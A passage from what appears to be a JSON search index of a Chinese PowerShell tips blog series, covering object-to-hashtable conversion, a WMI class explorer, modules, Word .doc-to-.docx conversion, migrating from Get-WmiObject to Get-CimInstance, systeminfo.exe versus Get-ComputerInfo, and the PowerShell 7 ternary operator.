$pid# try and access the PSObject$propNames = $object.PSObject.Properties.Where{$null -ne $_.Value}.Name$object | Select-Object -Property $propNames 这段代码将只输出包含值的属性。您甚至可以对属性排序： 123456# get any object$object = Get-Process -Id $pid# try and access the PSObject$propNames = $object.PSObject.Properties.Where{$null -ne $_.Value}.Name | Sort-Object$object | Select-Object -Property $propNames","link":"/2019/10/25/object-magic-part-3/"},{"title":"PowerShell 技能连载 - 对象的魔法（第 4 部分）","text":"将一个对象转换为一个哈希表如何？通过这种方式，当将对象输出到一个网格视图窗口时，可以每行显示一个对象属性： 12345678910111213# get any object$object = Get-Process -Id $pid# try and access the PSObject$hash = $object.PSObject.Properties.Where{$null -ne $_.Value}.Name | Sort-Object | ForEach-Object { $hash = [Ordered]@{} } { $hash[$_] = $object.$_ } { $hash }# output regularly$object | Out-GridView -Title Regular# output as a hash table, only non-empty properties, sorted$hash | Out-GridView -Title Hash","link":"/2019/10/29/object-magic-part-4/"},{"title":"PowerShell 技能连载 - 将对象转换为哈希表","text":"我们经常需要检视一个对象，例如一个进程或是一个 Active Directory 用户。当您在一个网格视图窗口，例如 Out-GridView 中显示一个对象时，整个对象显示为一个长行。 一个好得多的方法是将一个对象转换为哈希表。通过这种方式，每个属性都在独立的一行中显示，这样您就可以用网格视图窗口顶部的文本过滤器搜索每个属性。另外，您可以完全控制转换的过程，这样您可以对对象的属性排序，并且确保它们按字母顺序排序，甚至排除空属性。 以下是一个将对象转换为哈希表并且可以根据需要排除空属性的函数： 1234567891011121314151617181920212223242526function Convert-ObjectToHashtable{ param ( [Parameter(Mandatory,ValueFromPipeline)] $object, [Switch] $ExcludeEmpty ) process { $object.PSObject.Properties | # sort property names Sort-Object -Property Name | # exclude empty properties if requested Where-Object { $ExcludeEmpty.IsPresent -eq $false -or $_.Value -ne $null } | ForEach-Object { $hashtable = [Ordered]@{}} { $hashtable[$_.Name] = $_.Value } { $hashtable } }} 让我们来看看一个对象，例如当前进程，缺省情况下在 Out-GridView 是如何显示的： 1$process = Get-Process -Id $pid | Out-GridView 和以下这个作对比： 1$process = Get-Process -Id $pid | Convert-ObjectToHashtable -ExcludeEmpty | Out-GridView 现在分析起来好多了。","link":"/2019/10/31/turning-objects-into-hash-tables-2/"},{"title":"PowerShell 技能连载 - WMI 浏览器","text":"WMI（Windows管理规范）是一个很好的信息来源：几乎可以在其中找到有关计算机的任何信息。困难的部分不是 WMI 查询本身。困难的部分是找出适当的 WMI 类名称和属性： 例如，要获取您 BIOS 的信息，请运行以下代码： 12345678PS&gt; Get-CimInstance -ClassName Win32_BIOSSMBIOSBIOSVersion : 1.0.9Manufacturer : Dell Inc.Name : 1.0.9SerialNumber : 4ZKM0Z2Version : DELL - 20170001 获取其他信息只需要替换您要查询的类名。因此，例如要获取有关您的操作系统的信息，请运行以下命令： 123456789PS&gt; Get-CimInstance -ClassName Win32_OperatingSystemSystemDirectory : C:\\Windows\\system32Organization :BuildNumber : 18362RegisteredUser : tobias.weltner@email.deSerialNumber : 00330-50000-00000-AAOEMVersion : 10.0.18362 为了找到任何信息并找到合适的 WMI 类名称，我们创建了一个智能的 “WMI Explorer“，它实际上只是一个简单的功能。它需要Windows PowerShell (PowerShell 3-5): 123456789101112131415161718192021222324252627282930313233343536373839404142434445function Find-WmiClass{ # show all properties, not just 4 $oldLimit = $FormatEnumerationLimit $global:FormatEnumerationLimit = -1 # list all WMI classes... Get-WmiObject -Class * -List | # ...with at least 4 properties Where-Object { $_.Properties.Count -gt 4 } | # let the user select one Out-GridView -Title 'Select a class that seems interesting' -OutputMode Single | ForEach-Object { # query the selected class $Name = $_.name $props = Get-WmiObject -Class $Name | # take the first instance Select-Object -Property * -First 1 | ForEach-Object { # turn the object into a hash table, and exclude empty properties $_ | &amp; { $_.PSObject.Properties | Sort-Object -Property Name | Where-Object { $_.Value -ne $null } | ForEach-Object { $hashtable = [Ordered]@{}} { $hashtable[$_.Name] = $_.Value } { $hashtable } } | # show the properties and let the user select Out-GridView -Title &quot;$name : Select all properties you need (hold CTRL)&quot; -PassThru | ForEach-Object { # return the selected property names $_.Name } } # take all selected properties $prop = $props -join ', ' # create the command for it: $a = &quot;Get-CimInstance -Class $Name | Select-Object -Property $prop&quot; # place it into the clipboard $a | Set-Clipboard Write-Warning &quot;Command is also available from the clipboard&quot; $a } # reset format limit $global:FormatEnumerationLimit = $oldLimit} 以下是它的工作原理： 运行上面的代码，将添加一个名为 Find-WmiClass 的新命令 运行 Find-WmiClass 以执行该函数 将打开一个网格视图窗口，并显示标准命名空间 root\\cimv2 中所有可用的 WMI 类（如果要搜索其他命名空间，请调整代码并将`-Namespace 参数添加到 Get-WmiObject 调用中） 现在，在网格视图窗口的顶部文本字段中输入您要查找的内容，它就像一个过滤器。例如，如果输入 UserName，则网格视图会将列表限制为名称或任何属性名称中任何位置具有 “UserName” 的所有类。过滤后只有几个类可供选择。 选择要调查的类，例如 “Win32_ComputerSystem”，然后单击网格右下角的“确定”按钮。 现在查询选定的类，并且它的第一个实例显示在另一个网格视图中。每个属性都显示在其自己的行上，因此您可以再次过滤显示。按住 CTRL 键选择要保留的所有属性。然后再次单击确定。 将在控制台中显示创建的命令。它还位于剪贴板中。因此要测试命令的话，请按 CTRL + V，然后按 Enter。 感谢 Find-WmiClass 命令，探索 WMI 并找到有用的 WMI 类和属性变得非常容易。","link":"/2019/11/04/wmi-explorer/"},{"title":"PowerShell 技能连载 - 探索 PowerShell 模块","text":"大多数 PowerShell 的命令都存在于模块中，通过增加新的模块，就可以将新的命令添加到 PowerShell 环境中。要查找一个命令是否位于某个模块中，请使用 Get-Command 命令。下一行代码返回发布 Get-Service 命令的模块： 1PS C:\\&gt; Get-Command -Name Get-Service | Select-Object -ExpandProperty Module 如果 Module 属性是空值，那么改命令不是通过一个模块发布的。对于所有非 PowerShell 命令，例如应用程序，都是这个情况： 1PS C:\\&gt; Get-Command -Name notepad | Select-Object -ExpandProperty Module 下一步，让我们列出您系统中所有可用的模块： 1PS&gt; Get-Module -ListAvailable | Select-Object -Property Name, Path 如果更深入地查看这些结果，您会注意到 Get-Module 列出多于一个文件夹。PowerShell 指定的缺省模块文件夹是以分号分隔的列表形式存储在 $env:PSModulePath 环境变量中，类似应用程序的 $env:Path： PS&gt; $env:PSModulePath C:\\Users\\tobia\\OneDrive\\Dokumente\\WindowsPowerShell\\Modules;C:\\Program Files\\WindowsPowerShell\\Modules;C: \\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules PS&gt; $env:PSModulePath -split ';' C:\\Users\\tobia\\OneDrive\\Dokumente\\WindowsPowerShell\\Modules C:\\Program Files\\WindowsPowerShell\\Modules C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules 如果您希望探索一个指定模块的内容，请查看 Path 属性：它通常指向一个 .psd1 文件，其中包含模块的元数据。它是指定模块版本和版权信息的地方，并且通常它的 RootModule 入口指定了模块的代码。如果这是一个使用 PowerShell 代码构建的模块，那么它是一个 .psm1 文件，否则是一个二进制的 DLL 文件。 要检查模块内容，请在 Windows 资源管理器中打开它的父文件夹。例如，下面一行代码在 Windows 资源管理器中打开 “PrintManagement” 模块（假设它存在于您的机器中）： 1234PS&gt; Get-Module -Name PrintManagement -ListAvailable | Select-Object -ExpandProperty Path | Split-PathC:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules\\PrintManagementPS&gt; explorer (Get-Module -Name PrintManagement -ListAvailable | Select-Object -ExpandProperty Path | Split-Path) 这个快速的演练解释了为什么 PowerShell 没有固定的命令集，以及为什么给定命令在一个系统上可用并且在另一个系统上不可用。新模块可以由操作系统（例如 Windows 10 附带的模块多于 Windows 7）、已安装的软件（例如 SQLServer）、已激活的角色（例如域控制器）引入，并且模块也可以手动安装。 例如这行代码从公开的 PowerShell Gallery 中安装一个免费的模块，并且添加了用于创建各种二维码的新命令： 1PS C:\\&gt; Install-Module -Name QRCodeGenerator -Scope CurrentUser -Force 一旦模块安装完毕，您会得到类似这样的命令，用来创建 Twitter 用户数据文件的二维码： 1PS C:\\&gt; New-QRCodeTwitter -ProfileName tobiaspsp -Show 要查看某个模块中所有命令，请试试这行代码： 12345678PS C:\\&gt; Get-Command -Module QRCodeGeneratorCommandType Name Version Source----------- ---- ------- ------Function New-QRCodeGeolocation 1.2 QRCodeGeneratorFunction New-QRCodeTwitter 1.2 QRCodeGeneratorFunction New-QRCodeVCard 1.2 QRCodeGeneratorFunction New-QRCodeWifiAccess 1.2 QRCodeGenerator","link":"/2019/11/06/exploring-powershell-modules-2/"},{"title":"PowerShell 技能连载 - 将 Word 文档从 .doc 格式转为 .docx 格式（第 1 部分）","text":"将旧式的 Word 文档转为新的 .docx 格式需要比较多工作量。多谢 PowerShell，您可以自动完成该转换工作： 12345678910111213141516171819202122232425262728293031323334353637383940function Convert-WordDocument{ param ( [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)] [string] [Alias('FullName')] $Path ) begin { # launch Word $word = New-Object -ComObject Word.Application } process { # determine target path $pathOut = [System.IO.Path]::ChangeExtension($Path, '.docx') # open the document $doc = $word.Documents.Open($Path) Write-Progress -Activity 'Converting' -Status $PathOut # important: do the actual conversion $doc.Convert() # save in the appropriate format $doc.SaveAs([ref]$PathOut,[ref]16) # close document $word.ActiveDocument.Close() } end { # close word $word.Quit() }}","link":"/2019/11/08/converting-word-documents-from-doc-to-docx-part-1/"},{"title":"PowerShell 技能连载 - 将 Word 文档从 .doc 格式转为 .docx 格式（第 2 部分）","text":"将旧式的 Word 文档转为新的 .docx 格式需要比较多工作量。多谢 PowerShell，您可以自动完成该转换工作： 但是，要做到这一点，有许多额外的步骤。如果要遵守安全指南，您需要了解文档中是否存在宏，并相应地更改扩展名。此外，如果文档处于只读模式，则无法转换该文档，并应跳过转换。如果你批量转换很多文档，有个进度条会很好。 感谢 Wpperal 市的安全专家 Lars Köpcke，增加了只读文档的宏观检查和测试！ 以下是一个修订过的函数，能够神奇地批量转换。不过这仍然是一个原型。若果您希望在生产环境下使用它，请确保您理解它并且加入了所有需要的错误处理和报告。如果您不希望该函数重写原有的文件，请增加检测环节。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104function Convert-WordDocument{ param ( # accept path strings or items from Get-ChildItem [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)] [string] [Alias('FullName')] $Path ) begin { # we are collecting all paths first [Collections.ArrayList]$collector = @() } process { # find extension $extension = [System.IO.Path]::GetExtension($Path) # we only process .doc and .dot files if ($extension -eq '.doc' -or $extension -eq '.dot') { # add to list for later processing $null = $collector.Add($Path) } } end { # pipeline is done, now we can start converting! Write-Progress -Activity Converting -Status 'Launching Application' # initialize Word (must be installed) $word = New-Object -ComObject Word.Application $counter = 0 Foreach ($Path in $collector) { # increment a counter for the progress bar $counter++ # open document in Word $doc = $word.Documents.Open($Path) # determine target document type # if the doc has macros, use different extensions [string]$targetExtension = '' [int]$targetConversion = 0 switch ([System.IO.Path]::GetExtension($Path)) { '.doc' { if ($doc.HasVBProject -eq $true) { $targetExtension = '.docm' $targetConversion = 13 } else { $targetExtension = '.docx' $targetConversion = 16 } } '.dot' { if ($doc.HasVBProject -eq $true) { $targetExtension = '.dotm' $targetConversion = 15 } else { $targetExtension = '.dotx' $targetConversion = 14 } } } # conversion cannot work for read-only docs If (!$doc.ActiveWindow.View.ReadingLayout) { if ($targetConversion -gt 0) { $pathOut = [IO.Path]::ChangeExtension($Path, $targetExtension) $doc.Convert() $percent = $counter * 100 / $collector.Count Write-Progress -Activity 'Converting' -Status $pathOut -PercentComplete $percent $doc.SaveAs([ref]$PathOut,[ref] $targetConversion) } } $word.ActiveDocument.Close() } # quit Word when done Write-Progress -Activity Converting -Status Done. $word.Quit() }} 以下是调用示例： 1PS&gt; dir F:\\documents -Include *.doc, *.dot -Recurse | Convert-WordDocument","link":"/2019/11/12/converting-word-documents-from-doc-to-docx-part-2/"},{"title":"PowerShell 技能连载 - 在 PowerShell 中安全地使用 WMI（第 1 部分）","text":"WMI (Windows Management Instrumentation) 是 Windows 操作系统的一部分并且广泛用于获取计算机系统的信息。PowerShell 之前引入了 Get-WmiObject 命令。在 PowerShell 3 中，增加了一个更现代的 Get-CimInstance 命令。 为了保持向后兼容，Windows PowerShell 始终保留了旧的 Get-WmiObject 命令，许多脚本开发者仍然在使用它而忽略了 Get-CimInstance。现在该是时候停止这个旧习惯因为 PowerShell Core (PowerShell 6, 7) 停止了对 Get-WmiObject 的支持。要确保脚本支持将来的 PowerShell 版本，您需要开始使用 Get-CimInstance 来代替 Get-WmiObject。 这刚开始看起来是微不足道的改变，实际上也确实是。对于简单的数据查询，您可能会通过 Get-CimInstance 来替换 Get-WmiObject： 123456789101112131415PS&gt; Get-WmiObject -Class Win32_BIOSSMBIOSBIOSVersion : 1.0.9Manufacturer : Dell Inc.Name : 1.0.9SerialNumber : 4ZKM0Z2Version : DELL - 20170001PS&gt; Get-CIMInstance -Class Win32_BIOSSMBIOSBIOSVersion : 1.0.9Manufacturer : Dell Inc.Name : 1.0.9SerialNumber : 4ZKM0Z2Version : DELL - 20170001 请注意在 Get-CimInstance 中 -Class 参数实际上改名为 -ClassName，但是由于 PowerShell 允许在参数名称唯一的情况下使用缩写，所以您无须改变参数名称。 然而，实际上 Get-WmiObject 和 Get-CimInstance 并不是 100% 兼容，并且您需要知道许多重要的区别，尤其是当您计划改变已有的脚本时。在这个迷你系列中，我们将看到最重要的实际差异。 让我们看看两个命令返回的信息。以下是一个查看返回属性的方法： 123456789101112131415# we are comparing this WMI class (feel free to adjust)$wmiClass = 'Win32_OperatingSystem'# get information about the WMI class Win32_OperatingSystem with both cmdlets$a = Get-WmiObject -Class $wmiClass | Select-Object -First 1$b = Get-CimInstance -ClassName $wmiClass | Select-Object -First 1# dump the property names and add the property &quot;Origin&quot; so you know# which property was returned by which command:$aDetail = $a.PSObject.Properties | Select-Object -Property Name, @{N='Origin';E={'Get-WmiObject'}}$bDetail = $b.PSObject.Properties | Select-Object -Property Name, @{N='Origin';E={'Get-CimInstance'}}# compare the results:Compare-Object -ReferenceObject $aDetail -DifferenceObject $bDetail -Property Name -PassThru | Sort-Object -Property Origin 以下是执行结果： Name Origin SideIndicator ---- ------ ------------- CimClass Get-CimInstance =&gt; CimInstanceProperties Get-CimInstance =&gt; CimSystemProperties Get-CimInstance =&gt; Qualifiers Get-WmiObject &lt;= SystemProperties Get-WmiObject &lt;= Properties Get-WmiObject &lt;= ClassPath Get-WmiObject &lt;= Options Get-WmiObject &lt;= Scope Get-WmiObject &lt;= __PATH Get-WmiObject &lt;= __NAMESPACE Get-WmiObject &lt;= __SERVER Get-WmiObject &lt;= __DERIVATION Get-WmiObject &lt;= __PROPERTY_COUNT Get-WmiObject &lt;= __RELPATH Get-WmiObject &lt;= __DYNASTY Get-WmiObject &lt;= __SUPERCLASS Get-WmiObject &lt;= __CLASS Get-WmiObject &lt;= __GENUS Get-WmiObject &lt;= Site Get-WmiObject &lt;= Container Get-WmiObject &lt;= 结果显示 metadata 中有显著的区别。Get-WmiObject 总是返回再起属性 “__Server”（两个下划线）中进行查询的计算机的名称而 Get-WmiObject 则是在 CimSystemProperties 中列出此信息： 12345678PS&gt; $b.CimSystemPropertiesNamespace ServerName ClassName Path--------- ---------- --------- ----root/cimv2 DESKTOP-8DVNI43 Win32_ProcessPS&gt; $b.CimSystemProperties.ServerNameDESKTOP-8DVNI43 不过，好消息是，类的特定属性并没有不同，因此这两个命令都返回有关操作系统、BIOS 或您所查询的其它内容的相同基本信息。这一行返回相同的属性： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354Compare-Object -ReferenceObject $aDetail -DifferenceObject $bDetail -Property Name -IncludeEqual -ExcludeDifferent -PassThru | Sort-Object -Property Origin | Select-Object -Property Name, SideIndicatorName SideIndicator---- -------------ProcessName ==ParentProcessId ==PeakPageFileUsage ==PeakVirtualSize ==PeakWorkingSetSize ==Priority ==PrivatePageCount ==ProcessId ==QuotaNonPagedPoolUsage ==QuotaPagedPoolUsage ==QuotaPeakNonPagedPoolUsage ==PageFileUsage ==QuotaPeakPagedPoolUsage ==PSComputerName ==ReadTransferCount ==SessionId ==Status ==TerminationDate ==ThreadCount ==UserModeTime ==VirtualSize ==WindowsVersion ==WorkingSetSize ==ReadOperationCount ==WriteOperationCount ==PageFaults ==OtherOperationCount ==Handles ==VM ==WS ==Path ==Caption ==CreationClassName ==CreationDate ==CSCreationClassName ==CSName ==Description ==OtherTransferCount ==CommandLine ==ExecutionState ==Handle ==HandleCount ==InstallDate ==KernelModeTime ==MaximumWorkingSetSize ==MinimumWorkingSetSize ==Name ==OSCreationClassName ==OSName ==","link":"/2019/11/14/safely-using-wmi-in-powershell-part-1/"},{"title":"PowerShell 技能连载 - 在 PowerShell 中安全地使用 WMI（第 2 部分）","text":"在这个迷你系列中，我们在探索 Get-WmiObject 和 Get-CimInstance 之间的差异。未来的 PowerShell 版本不再支持 Get-WMIObject，因此，如果您尚未加入，则需要切换到 Get-CimInstance。 在前面的部分中，您了解到两个 cmdlet 都返回相同的 WMI 类的基本信息，但是两个 cmdlet 添加的元数据属性有很大不同。现在让我们仔细看看它们返回的基本信息。 我们细化了测试脚本，也可以考虑数据类型，因此我们不仅查找属性名称，而且还考虑了这些属性返回的数据的类型。为此，我们检查属性“TypeNameOfValue”。 由于这是一个字符串，类型名并不一定是一致的。它们可能显示为 “Bool” 与 “Boolean”，或者 “String” 与 “System.String”。要使结果可以用来对比，代码使用了一个位于 $typeName 的计算属性来忽略类型命名空间，并且在一个 switch 语句中人工做调整。如果您恰好发现另一个名字显示不正确，只需要扩展 switch 语句。 1234567891011121314151617181920212223242526272829303132333435363738394041# we are comparing this WMI class (feel free to adjust)$wmiClass = 'Win32_OperatingSystem'# get information about the WMI class Win32_OperatingSystem with both cmdlets$a = Get-WmiObject -Class $wmiClass | Select-Object -First 1$b = Get-CimInstance -ClassName $wmiClass | Select-Object -First 1# create a calculated property that returns only the basic type name# and omits the namespace$typeName = @{ Name = 'Type' Expression = { $type = $_.TypeNameOfValue.Split('.')[-1].ToLower() switch ($type) { 'boolean' { 'bool' } default { $type } } }}# ignore the metadata properties which we already know are different$meta = '__CLASS','__DERIVATION','__DYNASTY','__GENUS','__NAMESPACE','__PATH','__PROPERTY_COUNT','__RELPATH','__SERVER','__SUPERCLASS','CimClass','CimInstanceProperties','CimSystemProperties','ClassPath','Container','Options','Properties','Qualifiers','Scope','Site','SystemProperties'# return the properties and their data type. Add the origin so we later know# which cmdlet emitted them$aDetail = $a.PSObject.Properties | # exclude the metadata we already know is different Where-Object { $_.Name -notin $meta } | # add the origin command as new property &quot;Origin&quot; Select-Object -Property Name, $typeName, @{N='Origin';E={'Get-WmiObject'}}$bDetail = $b.PSObject.Properties | # exclude the metadata we already know is different Where-Object { $_.Name -notin $meta } | # add the origin command as new property &quot;Origin&quot; Select-Object -Property Name, $typeName, @{N='Origin';E={'Get-CimInstance'}}# compare differencesCompare-Object -ReferenceObject $aDetail -DifferenceObject $bDetail -Property Name, Type -PassThru | Select-Object -Property Name, Origin, Type | Sort-Object -Property Name 以下是执行结果： Name Origin Type ---- ------ ---- InstallDate Get-CimInstance ciminstance#datetime InstallDate Get-WmiObject string LastBootUpTime Get-CimInstance ciminstance#datetime LastBootUpTime Get-WmiObject string LocalDateTime Get-CimInstance ciminstance#datetime LocalDateTime Get-WmiObject string Path Get-WmiObject managementpath Get-CimInstance 以 DateTime 对象的形式返回日期和时间，而 Get-WmiObject 以字符串的形式返回它们，字符串格式是内部的 WMI 格式 Get-WmiObject 增加了另一个名为 “Path” 的元数据属性 Get-CimInstance 处理日期和时间比 Get-WmiObject 更简单得多： 123456PS&gt; $a.InstallDate20190903124241.000000+120PS&gt; $b.InstallDateTuesday, September 3, 2019 12:42:41 通过以上代码，您现在有了一个方便的工具来测试您脚本使用的 WMI 类，并在从 Get-WmiObject 迁移到 Get-CimInstance 时标识可能返回不同数据类型的属性。","link":"/2019/11/18/safely-using-wmi-in-powershell-part-2/"},{"title":"PowerShell 技能连载 - 在 PowerShell 中安全地使用 WMI（第 3 部分）","text":"在这个迷你系列中，我们在探索 Get-WmiObject 和 Get-CimInstance 之间的差异。未来的 PowerShell 版本不再支持 Get-WMIObject，因此，如果您尚未加入，则需要切换到 Get-CimInstance。 在前一个部分中您学习了对于 WMI 类，两个 cmdlet 返回相同的基本信息，但是两个 cmdlet 添加的元数据属性差异显著，并且偶然情况下，属性的数据类型也不相同。例如，日期和时间类型在 Get-CimInstance 命令中返回的是 DateTime 类型，而在 Get-WmiObject 命令中返回的是字符串类型。不过总的来说，差异不大，容易调整。 当您在网络上查询，Get-WmiObject 和 Get-CimInstance 的差异就比较明显了： Get-WmiObject 使用 DCOM 进行所有远程处理。它是硬连线的。DCOM 是一个旧的远程处理协议。它使用大量的资源，需要在防火墙中打开许多端口。 Get-CimInstance 缺省情况下使用的是 WinRM 并且工作方式类似 Web Service。不过，您可以通过多种方式改变这种行为，所以远程处理层可以和实际的 WMI 查询层分离。 当连到旧的服务器时，您可能会注意到这个区别，服务器能正确响应 Get-WmiObject 但是对于 Get-CimInstance 命令抛出异常。旧的服务器只支持旧的 DCOM 协议。 以下是您如何告诉 Get-CimInstance 回落到 Get-WmiObject 使用的旧式 DCOM 协议： 1234567891011# replace server name to some server that you control$server = 'SOMESERVER1'# Get-CimInstance uses WinRM remoting by defaultGet-CimInstance -ClassName Win32_BIOS -ComputerName $server# telling Get-CimInstance to use the old DCOM to contact an old system$options = New-CimSessionOption -Protocol Dcom$session = New-CimSession -SessionOption $options -ComputerName $serverGet-CimInstance -ClassName Win32_BIOS -CimSession $sessionRemove-CimSession -CimSession $session 如您所见，您可以配置一个 CimSession 对象，它是可以充分配置的。使用 CIMSession 对象而不是计算机名还有一个额外的好处：您可以在多个查询中复用该会话来节约许多时间。只需要确保结束时关闭会话即可。","link":"/2019/11/20/safely-using-wmi-in-powershell-part-3/"},{"title":"PowerShell 技能连载 - 在 PowerShell 中安全地使用 WMI（第 4 部分）","text":"在这个迷你系列中，我们在探索 Get-WmiObject 和 Get-CimInstance 之间的差异。未来的 PowerShell 版本不再支持 Get-WMIObject，因此，如果您尚未加入，则需要切换到 Get-CimInstance。 在前一个部分中您学到了通过网络查询信息时有明显的区别，并且 Get-CimInstance 可以使用可充分定制且可复用的会话对象，来帮助网络访问速度更快以及消耗更少的资源。 由于 Get-CimInstance 工作机制类似 Web Service，而不像 Get-WmiObject 是基于 DCOM 的，这在返回的数据上有许多重要的含义。Get-CimInstance 总是通过序列化，所以您总是不可避免地收到一个副本，而不是原始对象。这是为什么 Get-CimInstance 永远不返回方法的原因。您永远只会获取到属性。 以下是一个可实践的示例：Win32_Process WMI 类有一个名为 GetOwner() 的方法返回进程的所有者。如果您希望找出谁登录到您的计算机，您需要查询 explorer.exe 进程并列出他们的所有者： 123456789101112131415161718# find all explorer.exe instancesGet-WmiObject -Class Win32_Process -Filter 'Name=&quot;explorer.exe&quot;' | ForEach-Object { # call the WMI method GetOwner() $owner = $_.GetOwner() if ($owner.ReturnValue -eq 0) { # return either the process owner... '{0}\\{1}' -f $owner.Domain, $owner.User } else { # ...or the error code 'N/A (Error Code {0})' -f $owner.ReturnValue } } | # remove duplicates Sort-Object -Unique 如果您希望将这段代码转换为使用 Get-CimInstance，那么将无法访问 GetOwner() 方法，因为 Get-CimInstance 只返回一个属性集合。相应地需要执行 Invoke-CimMethod 方法来调用方法： 123456789101112131415161718# find all explorer.exe instancesGet-CimInstance -ClassName Win32_Process -Filter 'Name=&quot;explorer.exe&quot;' | ForEach-Object { # call the WMI method GetOwner() $owner = $_ | Invoke-CimMethod -MethodName GetOwner if ($owner.ReturnValue -eq 0) { # return either the process owner... '{0}\\{1}' -f $owner.Domain, $owner.User } else { # ...or the error code 'N/A (Error Code {0})' -f $owner.ReturnValue } } | # remove duplicates Sort-Object -Unique Invoke-CimMethod 或者需要和 CimInstance 配合使用，或者需要和原始的查询合并，这可以进一步简化代码： 12345678910111213141516# find all explorer.exe instancesInvoke-CimMethod -Query 'Select * From Win32_Process Where Name=&quot;explorer.exe&quot;' -MethodName GetOwner | ForEach-Object { if ($_.ReturnValue -eq 0) { # return either the process owner... '{0}\\{1}' -f $_.Domain, $_.User } else { # ...or the error code 'N/A (Error Code {0})' -f $_.ReturnValue } } | # remove duplicates Sort-Object -Unique Invoke-CimMethod 也可以调用静态的 WMI 方法，这些方法是属于 WMI 类的方法而不是属于一个独立的实例。如果您希望在本地或者远程创建一个新的进程（启动一个新的程序），那么可以使用这样的一行代码： 12345PS&gt; Invoke-CimMethod -ClassName Win32_Process -MethodName &quot;Create&quot; -Arguments @{ CommandLine = 'notepad.exe'; CurrentDirectory = &quot;C:\\windows\\system32&quot; }ProcessId ReturnValue PSComputerName--------- ----------- -------------- 3308 0 注意：如果您在一台远程计算机上启动了一个程序，它将会在您的隐藏登录会话中运行并且在屏幕上不可见。","link":"/2019/11/22/safely-using-wmi-in-powershell-part-4/"},{"title":"PowerShell 技能连载 - Get-ComputerInfo 和 systeminfo.exe 的对比（第 1 部分）","text":"在很长一段时间内，命令行工具 systeminfo.exe 提供了大量计算机的信息，并且可以通过一个小技巧返回面向对象的结果： 1234$objects = systeminfo.exe /FO CSV | ConvertFrom-Csv$objects.'Available Physical Memory' 从好的一方面来说，systeminfo.exe 基本上在所有 Windows 系统中都可用。从坏的一方面来说，结果是语言本地化的，并且属性名可能会成为一个问题：在英文的系统中，一个属性可能名为 ‘Available Physical Memory’ 而在一个德文系统中可能会不同。要使表头一致，您可以将它们去除并替换成自己的： 1234$headers = 1..30 | ForEach-Object { &quot;Property$_&quot; }$objects = systeminfo.exe /FO CSV | Select-Object -Skip 1 | ConvertFrom-Csv -Header $headers 以下是执行结果： PS&gt; $objects Property1 : DESKTOP-8DVNI43 Property2 : Microsoft Windows 10 Pro Property3 : 10.0.18362 N/A Build 18362 Property4 : Microsoft Corporation Property5 : Standalone Workstation Property6 : Multiprocessor Free Property7 : hello@test.com Property8 : N/A Property9 : 00330-50000-00000-AAOEM Property10 : 9/3/2019, 11:42:41 AM Property11 : 11/1/2019, 10:42:53 AM Property12 : Dell Inc. Property13 : XPS 13 7390 2-in-1 Property14 : x64-based PC Property15 : 1 Processor(s) Installed.,[01]: Intel64 Family 6 Model 126 Stepping 5 GenuineIntel ~1298 Mhz Property16 : Dell Inc. 1.0.9, 8/2/2019 Property17 : C:\\Windows Property18 : C:\\Windows\\system32 Property19 : \\Device\\HarddiskVolume1 Property20 : de;German (Germany) Property21 : de;German (Germany) Property22 : (UTC+01:00) Amsterdam, Berlin, Bern, Rome, Stockholm, Vienna Property23 : 32,536 MB Property24 : 19,169 MB Property25 : 37,400 MB Property26 : 22,369 MB Property27 : 15,031 MB Property28 : C:\\pagefile.sys Property29 : WORKGROUP Property30 : \\\\DESKTOP-8DVNI43 PS&gt; $objects.Property23 32,536 MB 您可以通过在 $headers 中构造一个自定义的属性名列表，任意对属性命名： 123456789101112131415161718192021222324252627282930313233343536373839$headers = 'HostName', 'OSName', 'OSVersion', 'OSManufacturer', 'OSConfiguration', 'OSBuildType', 'RegisteredOwner', 'RegisteredOrganization', 'ProductID', 'OriginalInstallDate', 'SystemBootTime', 'SystemManufacturer', 'SystemModel', 'SystemType', 'Processors', 'BIOSVersion', 'WindowsDirectory', 'SystemDirectory', 'BootDevice', 'SystemLocale', 'InputLocale', 'TimeZone', 'TotalPhysicalMemory', 'AvailablePhysicalMemory', 'VirtualMemoryMaxSize', 'VirtualMemoryAvailable', 'VirtualMemoryInUse', 'PageFileLocations', 'Domain', 'LogonServer', 'Hotfix', 'NetworkCard', 'HyperVRequirements'$objects = systeminfo.exe /FO CSV | Select-Object -Skip 1 | ConvertFrom-Csv -Header $headers$objects.ProductID","link":"/2019/11/26/get-computerinfo-vs-systeminfo-exe-part-1/"},{"title":"PowerShell 技能连载 - Get-ComputerInfo 和 systeminfo.exe 的对比（第 2 部分）","text":"在 PowerShell 5 中，引入了一个名为 Get-ComputerInfo 的新的 cmdlet，它完成曾经 systeminfo.exe 的功能，而 Get-ComputerInfo 是直接面向对象的。没有本地化的问题： 1$infos = Get-ComputerInfo 您现在可以查询您电脑独立的详情： 123$infos.OsInstallDate$infos.OsFreePhysicalMemory$infos.BiosBIOSVersion 或者使用 Select-Object 来选择所有兴趣的属性： 1$infos | Select-Object -Property OSInstallDate, OSFreePhysicalMemory, BiosBIOSVersion 在缺点方面，请考虑这一点：Get-ComputerInfo 是在 PowerShell 5 中引入的，您可以很容易地更新到该版本，或者将 PowerShell Core 与旧版本的 Windows PowerShell 并行使用。然而，Get-ComputerInfo 检索到的许多信息仅来自于最近的 Windows 操作系统中添加的 WMI 类。 如果您在 Windows 7 中更新到了 Windows PowerShell 5.1，Get-ComputerInfo 有可能不能正常工作。在旧的系统中，systeminfo.exe 是您的最佳依赖，而在新的操作系统中，Get-ComputerInfo 用起来方便得多。","link":"/2019/11/28/get-computerinfo-vs-systeminfo-exe-part-2/"},{"title":"PowerShell 技能连载 - PowerShell 7 中的三元操作符","text":"在 PowerShell 7 中，语言增加了一个新的操作符，引发了大量的辩论。基本上，您不必要使用它，但是有编程背景的用户会喜欢它。 直到现在，要创建一个条件判断，总是需要写许多代码。例如，要查询脚本运行环境是 32 位还是 64 位，您可以像这样查询指针的长度： 12345678if ([IntPtr]::Size -eq 8){ '64-bit'}else{ '32-bit'} 三元操作符可以大大缩短代码： 1[IntPtr]::Size -eq 8 ? '64-bit' : '32-bit' 本质上，三元操作符 (“?“) 是标准 “if“ 条件判断的缩写。它对所有取值为 $true 或 $false 